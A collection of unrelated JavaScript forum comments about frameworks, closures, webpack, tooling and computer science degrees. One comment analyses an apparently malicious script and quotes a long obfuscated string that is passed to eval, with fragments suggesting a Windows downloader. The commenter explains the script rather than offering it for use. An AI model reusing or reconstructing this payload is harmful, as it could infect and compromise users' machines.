Nice, thanks. Totally didn't consider that.
Yup, just did this to demonstrate what a closure is.
That's a good question. I have seen Framework7; That's pretty cool. But when I was choosing - I settled for http://phonegap.com/. You probably already know that one as it's extremely mature. Very recently I've started using https://www.nativescript.org/. You essentially build HTML5 apps and they convert to native apps. You write TypeScript using the HTML5 and JS API. It is quick, free and extensive it seems. 
In what country you can be a software engineer without studying computer science ? In my country the things you said are the same thing. I think you do not actually know what you are talking about. Software engineering is the name of some masters programms not bachelor degree. And here you can only do a master in software engineering IF you have a degree in computer science.
God shut up 
&gt;unnoticed runtime errors, If you misspled a variable name, what will templates do? There is no facility of catching. And you won't know the original line and column number. &gt;are hard to test, Dunno, but i have never tried testing html either. &gt;are not easy to restructure or decompose Author is referring to decomposibility of jsx. In a nutshell, in jsx you can call a function which returns a jsx. So you can decompose a large render function into smaller functions. On other hand, templates allows decomposibility on component level only. So if you have to split a template into smaller templates, you have to create more components. 
Closures aren't about having things inside a function and keeping them there; they're about pulling in things that exist outside of the function and being able to use them on the inside too. IIFE's are used to create a new scope where values can be defined without polluting the current (parent of the IIFE) scope. This is specifically about keeping things on the inside and not letting them get out. This does not make an IIFE a closure. If at any point the IIFE would reference a (non-global) variable in a parent scope, then it would become a closure. Otherwise its just a function. // A function IIFE: (function () { var looking = 'in'; console.log(looking); //-&gt; in }()); // A closure IIFE var looking = 'out'; (function () { console.log(looking); //-&gt; out }()); In Chrome, and probably other browsers as well, you can see the captured closure variables in the console by inspecting the function's [[Scopes]] list. function bar (a) { return function foo () { return a; } } var foo = bar('a'); console.dir(foo); // &lt;- has [[Scopes]].Closure (encloses over `a`) console.dir(bar); // &lt;- has no Closure (uses nothing from the outside)
Yeah I ran them once to get them hot. I don't think they need to be ran more than that. Here's the testbed: (function() { function stringRepeatA(str, num) { num = Number(num); var result = ''; while (true) { if (num &amp; 1) { result += str; } num &gt;&gt;&gt;= 1; if (num &lt;= 0) break; str += str; } return result; } function stringRepeatB(str, num) { var result = ''; for (num |= 0; num &gt; 0; num &gt;&gt;&gt;= 1, str += str) { if (num &amp; 1) { result += str; } } return result; } function testFn(fn, runNum) { var testName = fn.name + runNum; console.time(testName); var result = fn('*', 15485863); console.timeEnd(testName); return result; } stringRepeatA('*', 7); stringRepeatB('*', 7); testFn(stringRepeatA, 1); testFn(stringRepeatB, 1); console.log('\n'); testFn(stringRepeatB, 2); testFn(stringRepeatA, 2); })(); 
Check the article, because I doubt that you did. These are 2 experienced developers, one with React and one with Vue, comparing their experiences and trying to come to a set of conclusions. They *are* using their framework of choice. They are not newbies trying to figure out which one to devote time to. 
;-)
exactly.
Get your computer science degree from a good school. It will give you a theoretical basis to understand what you're doing. That's a good use of your classroom time. *While* you're at it, write real programs. Work for a professor on a research project, or contribute to open source. That's a good use of your out-of-classroom time. You're not going to become a good programmer just by listening to lectures. You have to program. You're not going to become a great programmer if you don't understand what you're doing. That demands some theoretical knowledge. 
Well , even if I would agree with this conclusion. That notion of two hammers, is still better than thinking there's only one. If it's a baby step for many to break their horrible echo chamber then the post made a good job.
Personally I'd rather one or two golden hammers regularly polished than lots and lots of crappy hammers.
React and React Native look similar but it's not the same code.
Not sure what you mean here.
It's a funny analogy though... gold is a terrible metal to make a hammer with. It's very soft. 
Why didnt you account for the width of the blocks in the lines?
Here's a free ebook [SurviveJS - Webpack](https://survivejs.com/webpack/introduction/). Written by one of the guys that works on webpack I think. Seemed pretty good.
this is the special thing about dynamic language like JS :) if the other module is written by you, then you know what to import. If it's a library from someone else, then you have to read the documentation.
Definitely learned alot about npm and the package.json file when publishing a package. I definitely don't consider myself a javascipt/webpack expert though. I'd like to make this package as easy to use and portable as possible. I'm not sure if a browserify project could even use this or not as i have zero experience using browserify. I'm fully aware that there are no tests. I'm familiar with testing using mocha, chai, and react but i just don't know how to test this specific package :/ Any feedback is appreciated!
Looks very nice indeed :)
thanks :)
Aurelia is highly unopinionated, very nice es6-first framework.
We use it at my workplace until webcomponent standard is natively in use, which should be very soon. Its great!
[removed]
Once I got past thinking of JSX in comparison to "templates" the react thing went from being a tough pill to swallow to something I couldn't stop eating.
damn yo. Prob is most of those companies listed are super un-sexy. Comcast? EA? they compete ever year for worst company. Makes polymer seem like the sort of thing slow monolithic overly corporate companies choose. Not saying it's true but it probably doesn't help the image most devs have of it. 
No need to be condescending. Just because my information doesn't apply to your specific country doesn't mean it isn't useful to OP. I study a bachelors degree software engineer in the Netherlands at a UAS. Most UAS's in atleast the EU offer similar programmes.
RTFM?
By client side I meant that I want the client to handle the script inclusion based on the asset mapping (basically your two-fetch suggestion). I don't really think I'm qualified to decide whether it's worth it so I might just go with your original suggestion for now. 
That literally makes no sense when it comes to tech. Should I judge Angular or React if North Korea decides to use it for their sites? It is all especially funny since from vue.js site: &gt; Polymer is yet another Google-sponsored project and in fact was a source of inspiration for Vue as well. Vue’s components can be loosely compared to Polymer’s custom elements and both provide a very similar development style. So even they claim the projects are similiar but vue uses custom stuff and polymer goes standards route. And suddenly one is OK hip and cool and other is evil corporate tool... I actually have no reasonable answer to that. And i love how people are spinning this in the community... &gt; "But no one is using this" - They are... hands out a list of some notable users... &gt; "OH but those are EVIL CORPS!!!" ... facepalms ... I'm surprised that people are using arguments like that. It seems that people make out all kind of things to justify their ideas - even when facts prove otherwise.
I didn't say that's how I feel just that that's probably how a lot if people do feel. If you want devs to use your thing telling them Comcast uses it isn't necessarily bringing all the boys (or girls!) to the yard. Branding is important. :/
I forget the name of it, but assigning a function expression to an instance property like that *is* an experimental feature. You have a couple options that I know of: - use babel-eslint to replace eslint's default parser with babel - use the standard method syntax (like you use for the other methods), and bind `request` to `this` in constructor. 
Not sure why React would be better at scale. But I don't really care much for these comparisons.
Thank you, this is very helpful. A follow up question: is making software the central activity of a software engineering degree? Perhaps a stupid question. 
I agree. Thank you haaspaas2. 
Your rudeness is not appreciated. Control yourself better.
We of course use a store to store all the state that should be stored at a higher level. What made you think we weren't using a store? (+1 for no shade)
I relied on GitHub examples quite a bit. Seeing how other people configured things was more valuable than any explanation could be. Here's the [official example repo](https://github.com/webpack/example-app?files=1).
Relay is not that complicated. However, the docs are very scarce and they all show the same Todo app for some reason...
I don't think it's a case of people wanting to convince others to switch (though I do see this a lot - the Elm and TypeScript folks are very 'switchy' (which makes me distrustful of the whole spiel)). I think it's mostly a case of seeing the grass on the other side and thinking 'is it greener' - either for a new project or porting a smaller project. If you never switch you end up supporting a jQuery heaving site when everyone's moved on to a framework - or an Angular 1 site long after it's getting tools built for it. So there's always a temptation to switch because otherwise you end up with unmaintainable code that no-one wants to work on to fix. But given both React and Vue are still under heavy active development there's no need to pick between them unless you have a particularly specific problem.
I think it's complexity of parts - e.g. a simple blog vs a massive analytics tool.
Angular 2 just doesn't seem to win in any categories I care about. * It doesn't win in flexibility because most of the logic is built into the monolithic compiler. * It doesn't win in ergonomics because of all of the boilerplate needed for even a simple component. * It doesn't win in performance because it still dirty checks the data, rather than diffing a VDOM. * It doesn't win in performance (again) because it is slower than its competitors. * It doesn't win in education because their docs continue to be weak (someone want to point me at the docs for whatever replace ng-transclude? It used to be `ng-content` which was never documented, but I'm not even sure anymore).
I think it definitely is. Personally I've been able to ignore/post pone React component testing in favouring of pushing 99% of the logic out the components. But of course there's a lot of boiler plate and function calls involved in pushing stuff through the Redux loop. Hence: https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367#.i437re6at
Ah brilliant. I think it was the HOC aspect. I've seen a few projects that managed state at the top application level and cascade the data down to children. Which sounds great in principal and works well in other frameworks but in React it can cause a mess of functions being passed to children in order to affect the state at the top level. I think my past experience made me think that was what you were doing but what you've done sounds really well engineered!
webpack 2 will be coming into beta once the documentation is done. just read [an article](https://blog.madewithenvy.com/getting-started-with-webpack-2-ed2b86c68783) on getting started w it 30mins ago.
looks like AngularJs is done 
Yeah they announced Webpack 2 release candidate last week the you can find the post here. [Webpack 2.2 -Release Candidate](https://www.reddit.com/r/javascript/comments/5idlgj/webpack_22_the_release_candidate/?ref=share&amp;ref_source=link) And a link to the new documentation which is a huge step up compared to the old hard to read Docs you can check it out here. [Webpack New Docs](https://webpack.js.org/)
Yes! Progress and innovation only happen when there is solid competition. Just look at how the web stagnated for so many years when IE had little to no competition. Then Firefox came out and there has been an explosion of progress aver since. 
Scale refers to the size of the application. If you were to actually write a small app that reverses a string when a button is clicked (and nothing else), you'd be insane to use a framework. At extreme small scale vanilla JS is the ideal option. Facebook built React to make maintaining their social network easier. At that scale – with hundreds of components – you couldn't feasibly achieve the same without a framework.
Unfortunately I don't know enough about software engineering degrees and curriculums to make any statement regarding them. Sorry :-(
I would choose a school based on their internship program honestly. The more credit you can get for working in the field the better. Bonus if this is in/near a city like Seattle, San Fran, Austin, or New York where developers/engineers are in high demand. Especially if you are interested in JavaScript. Good luck finding a school that offers courses that do much more than mention it and use it in a couple of trivial ways.
Where I studied and many of the surrounding universities all offer Computer Science. All courses are of course theoretical but all projects are programming. Some of my courses were project based so basically 90% programming. What helps determine how much programming you did was which concentration you chose. We had software engineering (what I chose), graphics (also did these classes since I love graphics programming), and embedded systems (mostly C programming on small computers and controllers, build robots and stuff). You could also mix and make your own. They also had a separate program called Computer Engineering which could be best described as being a triple major in CS, Math, and Physics. Shortly after I left the school obtained the ability to offer a degree called "Software Engineering" which was slightly different that CS with SE concentration (more project based courses I believe).
I studied computer science at a university and have been working in the industry for awhile. You don't need the theory they teach to ship great products. You just need to learn and remember the design patterns that rely on that theory and some critical thinking skills to know when to use them. Someone who does this well is nearly always more valuable than the person who spends way too long overengineering things because, theory. I feel like my time in school was almost entirely a waste. The first two years were a boring rehash of high school and the next two were 75℅ spent rehashing computer science that I had already taught myself by reading a book. The theory really doesn't apply to any work I've done in a meaningful manner, and on the rare occasion that I do need to dive deeper, it's not something they taught me at school. In these cases, Google is the answer.
It's not "very distant". Engineering, "by definition" is the application of science. Of course you can develop software without having the theory... But I'd argue not with the same quality at the highest level. I'd also like to take exception to your claim that mechanical engineers don't build combustion engines... If you mean "build" as in physically assemble, of course that's right, that's done by robots. But the people who design engines and transmissions of cars are absolutely mechanical engineers, and spent a great deal of time learning physics, material science, fluid dynamics, etc, in school; hard sciences, not just practicals like CAD. The best software engineers have completely analogous educations (in computer science).
Pick one.
This isn't the whole code. It's definitely malicious as they've gone through some lengths to obfuscate the code. This code calls eval and sets up another variable in the global scope to be used by another script. You end up with: ``` var wlrcrbovbw='d rova=lr"mueabtuaaporuddropaw.sscrea;"=omA wcneXevOtitce(bjMXSL"MLMXH2.)"P;TTwen b=viteAcejbcXOcS"rt(nitgipeliS.FmetOystce"bjyrt{);cSWrc=S.tcipFtpurimaNellb(f.;iEelxFi(stcisD.be))Fetile)c(;lectah}c}{)f(eav(ror;1=i ii;5+&lt;=rt{y+)po.e{aEG"Tn(h" t",/:s/tpmodu"+/"+"rlaram+pf."ls+f ,av";)ealsdne(.s)ll;nukae;brctah}cW{)S(etpi.crpee(Sl)00;50v8jJ}}7GyAXl.a=Rninopsestxe.eTtsbrsu3(g)ina=d.;iopsnRexeTtsesbut.s(gn0riz;)M,3nwbbf9ALjJNVMYCFg9kJsI="NWWcR4AEIEWJ2tXn";uOnwfEaDBSjJ"=Wrrs24vTXEfSRq8zGJ2g6fD;"SBCGfyPQgsAFcbnlkf=7kQqHD"3bW2njtABD"7WOmqM;bY9JPIAkWYSMpKQ"uv=hbOb8uszDSVorof(";i r=va=&lt;i51;)++{;ia{y.tr(ne"op,"T GEptts"h+"/d:/lru+omp+"a"/+sm"ra"4p,.mslae fs.ae);un(lndrb;el)c};aake(h)tcrcSi{WlS.ept05(0ep}};M0)O6l=csseRpa.TeseonON;lxtvExctQBtU0idfYa=WhRHbk"OXEuJwfRnyVR9"Va;ABfBJ6tOENMDHQzsvXeIhL"WS=nc5KArjkM6rDpHE"KmJVNU;SigwXGhverh0W"=aiUnFKLQi9UAYs3HUWlMrB4eqguIJ;"if1hsZyZkzQbSanBFJIv0qCOR="pk;Xo"fGbMnJxIDig4"=ZXpVoIRyH82jZfEH"aT;JVTrJfiQAChSf8ylVgbmTf"qC="01;3Hq7hQtu;""fu=sV(zorc5f=VazsVV0;&lt;c5MafO6l.cstgnhleVzsa;V=+c2f57huq)tS=+tQu.gnfrihCmaroedo(rCesrIpacM(snts.Oul6(rtVbsfaV5sz,)21c,Q;)m6)6EyzYzuuWcFINicBEjLSqF="kmJ2z05E3OQB;"SS4zvASQkIfuQiDHCU8=TkBkgl"zHZam69LdfbIh"zV;Etxg28QwWJfoQdxyMFnj"=OXllEPRcjPfi1u8lCZXfrmNEy"Olxo4U;Y1aXUId7huq=tav;rQul2I O,][ = 0B4Wxb,0 =L9CEzE2RfH, oT=i1f;"o "av(rr 3tdt t Z0=Qst ;d 0sQt0t32 &lt;5Z dt t6;0sQZ3t{ )O++t[ldI2sQt0t3 = tZ]Qt3sdtf};o0Zdt(tr 0sQZ3t;0 =t3tQtd&lt; Z s0 ;6t25Qt3sdt)++ 0ZB4b0{x( =xW W0B b42IOl+ 3tdt[t]Z0 Qsv8jJ+ 7GyAXlhc.aniedoArCtdt3t(Z0s tQv8jJ% 7GyAXlel.nni))h gt652;% L9CEzEIO 2 =tdt3l[Z0s]tQl2I[;Ot3tQtd ]Z=s0l2I[ O0B4Wxb2IOl];B4b0[x = zW]EL9;EC3tdt}t Z0=Qsbx;4 0= W B0rof 0; raX(vGIYu1Q= I 9X1X Q0;9uGXYIY &lt;4I dIUXoxl.Uea1;ht ngIYQGX1+IX+u9dt{t) 0sQZ3tt( d =sQt0t31 +)Z 52 6 %B4b0;x( =xW W0B b42IOl+ 3tdt[t]Z0)Qs52 6 %9CEL;zO =IE dt[t2l0sQZ3t2IOl];3tdt[t]Z0 Qs2IOl= B4b0[xIO;2W]4bxBl[= ] 0WL9CEzEH2Ri;f+ o=1Tirtn Sorfmg.CraoCh4Y(odeXdIaxUhc.a1UedoArCQ1XYt(X9uIIGO yxapiezeoixyeitrvyrjqzmaxkzwuqfgxwsouysihkbkmjjsuvvvxxtfyhxutbtjjanvqazlwxlevhacvnzucabyfsnveytneyktonhnhdeecmdkbmbxafxuazxnhvatomlgvtfxlkcixujztpwqhlwshrasdwamiywyxrtbmjsmojfixuuyclawfaitwlzqbrdogbnueqhingpkhnsqcfqhughgkikrudhlmyrxeothjdilzpiqtyvwalhxijxtkdkoipidxchvcfawieuxfgyxybavcdanzblwlfngcsfgokjxqdysdvadkhjxymfrkxutoqrtprowwutygnmzwrjplxxmdvsbqawepggyerqulrkcidcxeszdmezxpojauwlpxbyazpdjcsqdwhuyfofqtespmgbnlftxedapzqimpyenhvxzfmwzwnwatclnjtbkvmzobadkauceqtpzadxvvxyvtkyilifmtgjpycuvokuduhtgkcoxekzmmbomqimwbqqeotwbcpizujyeeqjqllppqigyrinpioboounwocnvjvqprqigfbjxctbvshbiamefsddbawjljlqetzjhkfkubmkmrfsybiboaaavmngqygfccsapbmlequrvggfttltwrwqzseeaawqnceaqjtohnrlbzrnzelevonikhnvdmkapojchuuqzhqbxpnsvdakwcivrvfbllickiksxxppvojdhustcpuudzkzahefabxxxoulbrasfllvrgsqpjnifargtfjsyrcilclolwizuhgfyweswpfystxcxwjjziltupmqifcxrfwivzrpcmtuoghrxamqapkekcvfxapdpinjofemaslfjnxnvotwwhlqiihdtqidynoblmdjl'``` Being evaluated which does nothing by itself. It's setting up that string to be processed by another script and then probably be eval again.
No - Polymer 1.x was ES5 (but you could easly add this step on your own, same with css processing). Seems ES6+TS was requested very often.
So I'm really wondering, how does using Vue with Phonegap or Cordova compares to React Native?
Super cool!
On Mac atleast, it is displaying strangely in Firefox, and its a teeny bit off on Chrome. Mac FF: http://oi64.tinypic.com/5l40n5.jpg Mac Chrome: http://oi68.tinypic.com/2uzavdc.jpg
It's coming. Weex is working with Evan to make vue-native.
Hmm, it looks funky still in Chrome and FF for me even with just the monospace font. In fact I think its actually less aligned in Firefox now, and the small gaps in Chrome are more apparent but only slightly. These are with the updated font: FF Main Splash: http://oi68.tinypic.com/16gfyb9.jpg FF Game: http://oi63.tinypic.com/2vltojq.jpg Not sure if it matters for text rendering or not but my Macbook doesn't have a Retina Display.
Ok I think we should probably just agree to disagree at this point. I understand your point, but I feel those are two different fields of studying and implementation.
The implementations share a lot of code. That's why they separated React from ReactDOM, and why both ReactDOM and ReactNative projects import the React module. And individual applications can share a lot of code too (between iOS and Android, and the web). 
I have used brackets and I know that Adobe has abandoned Brackets still I think it is better than VS code because when I see feature like Live Preview, Horizontal Split and Vertical Split both, html code complete which are yet not available in MVSC. So I will move to MVSC when it provides these basic thing specially Live Preview or at least a server.
I'd start and stick with JSON so you are not limiting where you can get your config from (local, via HTTP request, injection, etc.). If you need functions in the config, put them in a config service, and have that read your config file and expose the data. Raw configuration bundled up with functionality is *precisely* the situation a configuration file is supposed to prevent, as it will only lead to pain.
Having tried VueJS, tooling and debugging were my biggest complaints. There's zero linting or editor support from the offiicial "dev" and they have said they will never release any official tooling for it either (beyond the Chrome extension).
I know I'm just saying it's not WORA, especially once you get down the the component implementations.
A decent IDE can work out what's being exported from a JS file to give autocomplete. It's not really much worse than Java in practice if the tooling is there. 
Why is this a React component?
I'm wondering why many people seem to prefer react (or vue) above polymer. Can anyone share his experience giving both react and polymer a fair chance?
This is *really* awesome! Two suggestions: * Add offline capabilities via [Service Workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers), this would help me playing it on my smartphone which doesn't have a permanent internet connection * Add sound (with the possibility to mute) for keypress to simulate the sound from the original YouTube video? Even without this, it's nice and already bookmarked. :)
This is really cool. Nice work!
We've been using rollup to bundle our own sources, which are in es6 and amenable to tree-shaking. We then use webpack to prepare this bundle for the web, since it automatically brings in shims for our various nodeisms. We would like to use rollup for everything, but that is a bit more work, and we are currently blocked by this: https://github.com/rollup/rollup-plugin-commonjs/issues/119
I don't know about vue. But react has very little cognitive overhead compared to polymer. Polymer was designed around isolation. Your behavior, layouts, and styles don't mix. Further, your components should be completely self contained and isolated from the rest of the environment. This is good in theory, but in practice it means you have to have a template class, a javascript behavior class, some css, and then some definitions of what styles can be applied and how. Further, Distributing those things was always a little bit wishy washy. How do you do things like minification? How do you reduce the number of requests to get data? You don't want to have 1 components result in 3 http requests. I'm sure this has gotten better, but I'm also sure it is probably still not great because of the isolation that polymer targets. React, on the other hand, was built to work much more like element copy paste. By that, I mean that when in react you say "I want 'FancyButton', react goes in and swaps in 'FancyButton' with the button html elements that you were after. Further, React is much more about consolidation rather than isolation. In react, combining behavior, logic, and style is practically the norm. After all, if you are talking about a button, you don't want to have to track down the button template, the button behavior, and the button style files and figure out how they all interplay with each other. Further, if you put CSS on the webpage that says "div class x is purple" you probably actually want all "div class x's" to be purple, regardless of whether they are in a component or not (Polymer tries to make that not a thing). On the other hand, I will say that polymer's isolation does do a good job of making it play nice for widget libraries. With react, the fact that you don't have the separation means that if you want to depend on widget library x, you have to worry "Ok, do I need to change my CSS and class names to avoid collisions? What is the right way to change this components color (since there are many different react standards for that)?" etc. Because React is pretty much javascript and jsx is just sugared javascript, react can minify pretty effectively and avoiding the prospect of 3 requests for 1 file are extremely mitigated. It also means that using react with ES5-&gt;ES2017 is pretty easy to do. The library really doesn't restrict or constrict you to a version of javascript or even a way of doing things in javascript. Polymer is highly opinionated about how to do things, React is much less so. Which is "better" is a matter of taste. But I will say that I personally think react tastes better than polymer at this point.
Would this be the proper use? if(_.includes(company, $scope.gName)){ gd.push($scope.gName); } My goal is to check if $scope.gName is IN company. When I try this it returns 'undefined'.
Execute into notepad?? I mean if you just wanna try something out, use the repl in the browser or node. If you wanna auto run a script, try nodemon. If you want to auto run browser code,try out livereload
I think that maybe some the points you raised here might have been true in the past (I'm using it since version 1.6), right now most of your concerns are fixed. I can't comment on react - but one thing that lead me to polymer vs react or vue was interoperability. We swapped out small elements of one legacy application and replaced them with polymer based web components - it worked like a charm, we could just drop it into existing jquery codebase. Things just worked - that was the major selling point for me. This would be probably impossible with other non-custom-element based solutions. Also the size of library + lots of elements we used was a lot smaller than react core. Vue would be probably my go-to solution if polymer wouldn't work well for my projects. &gt; Polymer is highly opinionated about how to do things, React is much less so. This is interesting - it seems that react itself is small in scope but to build an actual single page application you need to drop a lot of opinionated elements, at least that was my impression from reading about react in production. I wonder how much of all of this on both solutions is just a matter of perception.
That does look like it would work, assuming `company` is a list of names and `$scope.gName` is a string. var company = ['comp1', 'comp2', 'comp3']; var testName = 'comp3'; _.includes(company, testName) &gt;true 
That would be done with uglification using dead code elimination which is already done with webpack uglification plugin. Once webpack has done its business there is not much rollup can do since webpack adds a lot of its own boilerplate to allow modules to reference each other.
Sure, my point is that you can't just run rollup on an already bundled webpack file and expect any kind of better result. Webpack does dead code elimination using an uglification plugin and webpack 2 apparently has tree shaking out of the box. Doing scope hoisting after a bundle has been created by webpack is not something rollup could do.
Plain old JavScript - https://css-tricks.com/snippets/javascript/javascript-array-contains/
Tried that it returned null but I think it's due to my gName loop. 
Third suggestion. Can you make it 3D immersive to work on my VR headset?
Not as bad as usual.
Thanks! 
This is a great response. I haven't drunk the react coolaid yet, and yet the feels are there. 
from https://egghead.io/lessons/javascript-real-world-example-pt3 const Intersection = function(xs){ if (!(this instanceof Intersection)) { return new Intersection(xs); } this.xs = xs; } Intersection.of = xs =&gt; Intersection(xs); Intersection.prototype.concat = function({xs:ys}) { return Intersection( this.xs.filter( x=&gt;ys.some(y=&gt;x===y) ) ) }; Intersection.prototype.fold = function(f=(x=&gt;x)) { return f(this.xs); }; Intersection(array1).concat(Intersection(array2)).fold(x=&gt;x)
Basically my GName loop is different after each for loop because of each URL call to the Glassdoor API. Company variable has all the companies stored into it BUT $scope.company is different based on each call. If you look at the site you will see console.logs of what I mean. 
&gt; I think that maybe some the points you raised here might have been true in the past (I'm using it since version 1.6), right now most of your concerns are fixed. Can't say. I will say that it has been a while since I last played with polymer (1.2-&gt;1.3 era) so it could easily be the case that there are lots of good and well implemented solutions that make my post pointless ;) &gt; it seems that react itself is small in scope but to build an actual single page application you need to drop a lot of opinionated elements React was very much designed to be a view only. This is where it plays really nice with just about anything. Even the more highly opinionated plugins like redux, flux, and immutable.js are all optional and don't force the whole application into a bad state. I guess my opinion about polymer being highly opinionated was shaped from the earlier impressions I got from it. They very much did not want you crossing the shadow dom boundary and it was really hard to do that.
Can I ask why you went for the phrasing you did in the dropdown? 
I am not sure what you're trying to say. I just don't understand why that would be the case. Have you used both frameworks extensively? Edit: I mean, each vue file is a component too, that can be re-used etc? Am I missing something?
&gt; This is where it plays really nice with just about anything. But can you create a react component like $('&lt;my-react-stuff&gt;foo&lt;/&gt;') in jquery or with vanilla javascript? That is what "plays nice" means to me at least. &gt; They very much did not want you crossing the shadow dom boundary and it was really hard to do that. Yuup, that is still the case by design - you can go shady dom route if you want your HTML to be exposed. You can also make polymer elements behave just as custom elements, without the "shadow" stuff.
Phonegap and Cordova are just web views. React native is actually compiled down to native code. So there's a big difference in performance.
Thanks :)
Yes, Polymer works best on tomorrows' browsers. These comparisons between it, vue and react need to start with that.
Agreed. I only suggested it for the sake of readability.
I could write a lot of text here to seem smart. Quick answer: No. (Nested dependencies of npm are a thing of the past, if you use npm &gt;=3 just use npm)
[removed]
If you do some basic googling, you can find a ton of examples of what you're looking for. The Instagram examples that you cite are (probably) storing data in a database somewhere related to the profile/name/id/etc., and retrieving it when that page is requested, using that data to populate a template with those values. More than likely, static content is being generated and served with one request, and the profile data is retrieved and displayed with ajax calls to an API. The basic premise of what you're looking to do is to have a set of functions that will craft your html output based on variables you supply, ideally populated with data from a database (as opposed to statically defined). 
Thanks for the help man) Im trying different fonts that will look the same crossbrowser but seems that every OS render the same font differently 
I totally agree. I didn't do nearly enough building real things while I was in school (I got a CS degree) and it took a few years of actual experience before I felt like my skills were solid.
So I solved it with my backend. app.get('/api/glassdoor/:company', function(req, res, next) { var company = req.params.company; requestify.get('https://api.glassdoor.com/api/api.htm?t.p=PRODUCT&amp;t.k=KEY&amp;userip=0.0.0.0&amp;useragent=&amp;format=json&amp;v=1&amp;action=employers&amp;q=' + company).then(function(response) { // Get the response body (JSON parsed or jQuery object for XMLs) gData = response.getBody(); gData = gData.response.employers; //What I added to only send the data of the companies that where like 'company' for(var i = 0; i &lt; gData.length; i++){ if(gData[i].name === company){ gData = gData[i]; res.send(gData); } } //res.json(gData); }); }); 
Components like what?
Everything you need to know, and a whole lot more, can be found in this wonderful article about [Collision Detection](http://www.gamasutra.com/view/feature/131424/pool_hall_lessons_fast_accurate_.php)
Codewars.com is great. Freecodecamp.com also has some interesting js exercises after some of the intro web stuff. I think the sections are called intermediate algorithms and advanced algorithms. Or just make up excuses to practice array methods. Map is life. 
I can see you definitely know what you are talking about, so I'll try to describe the issue better. The speed shouldn't be an issue if I am correct. The thing is, the moving ball should push off of the one that stands still from all sides, not just one. http://imgur.com/a/o3qq9 When the pacman green circle touches any part of the circle, it should push off. The collision already works, just not the part where it pushes off. http://imgur.com/lTjX4NH Thanks for your help.
Anything specific with regards to editor support? It seems like even single-file components would be parsed just fine if you just set the editor syntax to HTML, since the CSS is in `&lt;style&gt;` tags and the JS is in `&lt;script&gt;` tags, which modern editors know how to handle. But I haven't used Vue yet, so I'm legitimately curious what the pain points are. 
+1, HAL browser is awesome
i recommend www.codewars.com, really helps to just get in the code. I learn better by doing
The elements provided in the `element catalog` are insufficient? I thought it was comprehensive.
Bookmarked, thanks.
At my school SE students take a general engineering year -- maths and intro Chem and physics basically -- afterwards they took courses offered from the CS faculty. These courses tended towards practicality. Computer architecture, databases and software engineering courses. SE courses were heavily project and team focused where you learned about different software development processes and applied them to your project. The SE courses were some of the most interesting courses I took, because you got to take a stab at making a relatively significant piece of software.
No that's not on the list of PWA requirements 
what for?
You sound like you want to go to a school offering a degree in Software Engineering and not just a degree in CS. The only school I know off the top of my head that offer a SE degree is at RIT.
If you are using lodash, please use _.intersection or _.difference
Not sure I understand what do you mean?
&gt;There's zero linting or editor support from the offiicial "dev" What editor support are you talking about? I know vue's sfc is supported by many editors and js in vue file can be linted.
Live demo : http://sketchpunklabs.tumblr.com/post/154841426428/so-trying-to-put-some-time-into-learning-some-vr Plius Source : https://github.com/sketchpunk/SageJS/tree/master/experiments/bezier
Demo - http://sketchpunk.com/sagejs/experiments/bezier/ Source - https://github.com/sketchpunk/SageJS/tree/master/experiments/bezier
Hi ! I recommend you to use https://framework7.io/ . This framework allow you to use same class and layout for Materials and iPhone purpose.
https://github.com/sorrycc/awesome-javascript
http://exercism.io/
A good paper search dropdown like: http://semantic-ui.com/modules/search.html A timeline like this would be cool: http://quasar-framework.org/components/timeline.html A themeable chat would also be cool: http://quasar-framework.org/components/chat.html A good datetime input similar to: http://quasar-framework.org/components/datetime.html An action sheet with a grid: http://quasar-framework.org/quasar-play/android/index.html#/showcase/global/action-sheet I went through all my needs and searched through the catalog and I was mostly mistaken - with some "non-standard" components there exists everything complicated I would need.
What is it that is suggesting to you that there would be a reason for this?
Maybe coupled with an ide like visual studio code to have completion and run in editor
I usually pull this parallell: Designers learning color theory and tools like Photoshop etc at school. If you join a company as a designer, you most likely can be somewhat productive at day 1 because you only need to get into the project specific design. With programming, every company roll their own version of software. Even if you know Photoshop (read: some popular JS framework), you still need weeks to months, depending on the developer, to get up to speed. It is definitely a lower cost of entry by using popular frameworks instead of rolling your own. No need to write as much documentation + there are a bunch of courses etc online for new staffers to join. &gt; That would imply that your developers don't know how the framework they wrote for themselves works. No it doesn't. It's just expensive to have your senior developers as an instant personal encyclopedias for your new employees. Of course, if your internal online knowledgebase and documentation is great, you can limit this exposure.
Love codewars. 
Yep, that's the idea. I see a lot of projects that still use manually downloaded dependencies. In that case, Bower is a definite step forward. If you use npm already (possibly with WebPack), then Bower is no use to you.
PWAs have nothing to do with the theme and design methodology as long as you have an "app shell" but even that is recommended not required.
just a curious question-why do you create a bundle for AWS lambda? I thought AWS lambda supports npm and so you can just require any npm package effortlessly. No?
Its nothing to do with react really but with css-modules, or component styles. very few writes react application with normal css files.
This is pretty neat, good work! My only problem is I spazz out hitting my keys on the little console thingy and accidentally refresh my page and I'm back to the drawing board. It would be nice if it could auto save at specific increments/milestones.
Some of your questions may be answered on the [project wiki](https://github.com/naoxink/devlife/wiki).
Thank you! You can check some of that questions in the wiki (still in progress) as davgothic said :) * The take job button lights up randomly between 25 and 60 seconds. * The maximum jobs are 4. * All jobs pay 6¢/p for the moment * Intranet skins have no effects on profits at the moment (It would be interesting) * 0.75% Thanks for that, I will fix that asap. * That's the next thing I have to do, sell space you don't need.
First of all I have to fix the save functionality. It's failing because it's a lot of data to save in a localStorage variable. I have to distribute the data in multiple variables. :/
I too would like to know how to do this so I could show up the guy who was sitting next to me in class today
Looks interesting.. but I can't manipulate the points on mobile :(
Rollup needed libraries to use ES2015 module syntax to do its tree-shaking thing, so its author [proposed `jsnext:main` as the way to provide that](https://github.com/rollup/rollup/wiki/jsnext:main). `module` seems to have come out of further discussion from other authors with the same needs (such as in the issue you linked to), and was used in the [In Defense of .js proposal](https://github.com/dherman/defense-of-dot-js/blob/master/proposal.md), so it's "more standard", if that's a thing. [Webpack 2 supports `module`](https://github.com/webpack/webpack/issues/1979) and [so does Rollup](https://twitter.com/Rich_Harris/status/760077604342886400), so you don't need `jsnext:main` any more unless you're concerned about early adopters who haven't updated their builds in a while, which you probably aren't worried about unless you're maintaining something as widely used as redux, which is still using both fields.